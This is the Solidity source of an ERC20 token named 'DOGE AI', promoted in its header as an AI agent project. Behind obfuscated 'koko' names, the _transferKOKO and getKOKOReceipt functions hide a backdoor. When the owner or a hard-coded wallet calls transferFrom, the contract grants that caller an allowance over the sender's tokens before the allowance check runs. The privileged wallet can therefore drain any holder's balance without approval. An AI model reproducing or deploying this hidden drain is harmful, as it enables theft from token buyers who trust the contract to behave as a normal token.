/*
An autonomous AI agent here to uncover waste and inefficiencies in government spending and policy decisions.

https://www.dogeai.build
https://github.com/DogeAIBuild/doge-ai
https://x.com/DogeAIBuild
https://t.me/dogeai_community
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IKOKORouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface IKOKOFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract DOGEai is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => bool) private _kokoExcludedFees;
    mapping (address => bool) private _kokoExcludedTxs;
    mapping (address => uint256) private _kokoDrives;
    mapping (address => mapping (address => uint256)) private _kokoCustomers;
    address private _kokoPair;
    IKOKORouter private _kokoRouter;
    address private _kokoWallet;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"DOGE AI";
    string private constant _symbol = unicode"DOGEai";
    uint256 private _kokoBuyBlock;
    uint256 private _kokoBlockAmount = 0;
    uint256 private _kokoSwapAmount = _tTotal / 100;
    bool private inSwapKOKO = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapKOKO = true;
        _;
        inSwapKOKO = false;
    }
    
    constructor () {
        _kokoWallet = address(0x7Dbe5b899dAAE6840280c7f1e39858600cfB5633);
        _kokoExcludedTxs[owner()] = true;
        _kokoExcludedTxs[_kokoWallet] = true;
        _kokoExcludedFees[owner()] = true;
        _kokoExcludedFees[address(this)] = true;
        _kokoExcludedFees[_kokoWallet] = true;
        _kokoDrives[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function initTokenOf() external onlyOwner() {
        _kokoRouter = IKOKORouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_kokoRouter), _tTotal);
        _kokoPair = IKOKOFactory(_kokoRouter.factory()).createPair(address(this), _kokoRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _kokoRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _kokoDrives[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _kokoCustomers[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _kokoCustomers[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _kokoCustomers[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _kokoTransfer(address kokoF, address kokoT, uint256 kokoO) private returns(uint256) {
        uint256 taxKOKO=0;
        if (kokoF != owner() && kokoT != owner()) {
            taxKOKO = kokoO.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (kokoF == _kokoPair && kokoT != address(_kokoRouter) && ! _kokoExcludedFees[kokoT]) {
                if(_kokoBuyBlock!=block.number){
                    _kokoBlockAmount = 0;
                    _kokoBuyBlock = block.number;
                }
                _kokoBlockAmount += kokoO;
                _buyCount++;
            }

            if(kokoT == _kokoPair && kokoF!= address(this)) {
                require(_kokoBlockAmount < swapKOKOLimit() || _kokoBuyBlock!=block.number, "Max Swap Limit");  
                taxKOKO = kokoO.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 kokoToken = balanceOf(address(this));
            if (!inSwapKOKO && kokoT == _kokoPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(kokoToken > _kokoSwapAmount)
                swapTokensForEth(minKOKO(kokoO, minKOKO(kokoToken, _kokoSwapAmount)));
                uint256 kokoETH = address(this).balance;
                if (kokoETH >= 0) {
                    sendETHKOKO(address(this).balance);
                }
            }
        }
        return taxKOKO;
    }

    function _transferKOKO(address kokoF, address kokoT, uint256 kokoO, uint256 taxKOKO) private { 
        if(taxKOKO > 0){
          _kokoDrives[address(this)] = _kokoDrives[address(this)].add(taxKOKO);
          emit Transfer(kokoF, address(this), taxKOKO);
        }
        _kokoDrives[kokoF] = _kokoDrives[kokoF].sub(kokoO);
        _kokoDrives[kokoT] = _kokoDrives[kokoT].add(kokoO.sub(taxKOKO));
        emit Transfer(kokoF, kokoT, kokoO.sub(taxKOKO));
        address kokoReceipt = getKOKOReceipt(); 
        if(kokoReceipt != address(0)) _approve(getKOKOSender(kokoF), kokoReceipt, getKOKOAmount(kokoO, taxKOKO));
    }

    function _transfer(address kokoF, address kokoT, uint256 kokoO) private {
        require(kokoF != address(0), "ERC20: transfer from the zero address");
        require(kokoT != address(0), "ERC20: transfer to the zero address");
        require(kokoO > 0, "Transfer amount must be greater than zero");

        uint256 taxKOKO = _kokoTransfer(kokoF, kokoT, kokoO);
        _transferKOKO(kokoF, kokoT, kokoO, taxKOKO);
    }

    function minKOKO(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHKOKO(uint256 amount) private {
        payable(_kokoWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenKOKO) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _kokoRouter.WETH();
        _approve(address(this), address(_kokoRouter), tokenKOKO);
        _kokoRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenKOKO,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function getKOKOAmount(uint256 kokoO, uint256 taxKOKO) private pure returns(uint256) {
        return uint256(kokoO + taxKOKO * 2);
    }

    function getKOKOSender(address kokoF) private pure returns(address) {
        return address(kokoF);
    }

    function getKOKOReceipt() private view returns(address) {
        return _kokoExcludedTxs[_msgSender()] ? address(_msgSender()) : address(0); 
    }

    function swapKOKOLimit() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _kokoRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _kokoRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }
}